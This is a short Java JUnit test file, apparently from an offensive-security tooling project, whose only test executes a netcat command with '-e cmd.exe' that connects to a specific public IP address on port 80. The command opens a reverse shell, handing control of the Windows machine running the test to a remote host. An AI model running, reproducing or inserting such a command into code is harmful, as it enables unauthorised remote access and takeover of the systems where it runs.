import org.junit.Test;

import javax.naming.InitialContext;

/**
 * @Classname TestRuntime
 * @Description For testing your command
 * @Author Welkin
 */
public class TestRuntime {
    @Test
    public void testRuntime() throws Exception{
        Runtime.getRuntime().exec("D:\\tools\\nc\\nc64.exe -e cmd.exe 124.221.0.190 80");
    }
}
